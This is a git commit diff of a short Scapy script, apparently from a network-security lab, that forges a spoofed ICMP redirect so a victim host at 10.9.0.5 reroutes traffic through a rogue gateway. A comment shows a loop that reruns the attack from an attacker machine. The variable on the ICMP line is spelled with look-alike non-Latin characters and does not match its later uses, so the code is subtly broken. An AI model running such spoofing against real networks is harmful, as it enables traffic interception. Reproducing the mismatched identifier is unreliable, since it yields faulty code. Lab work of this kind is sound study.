b4ea78a5c1372956fdfa5e2d745dab07d96cc34d
ayhamibdah <ayhamibdah333@gmail.com>
2025-05-16 01:52:13 +0300

    Update icmp1.py

--- icmp1.py
+++ icmp1.py
@@ -3,8 +3,6 @@ from scapy.all import *
 ip = IP(src = '10.9.0.11' , dst = '10.9.0.5' )
 ісmр = ICMP(type=5, code=1)
 icmp.gw = '10.9.0.111'
-# The enclosed IP packet should be the one that
-# triggers the redirect message.
 ip2 = IP(src = '10.9.0.5', dst ='192.168.60.5')
 send (ip/icmp/ip2/ICMP());
 #attacker-10.9.0.105# while true; do python taskl.py;done
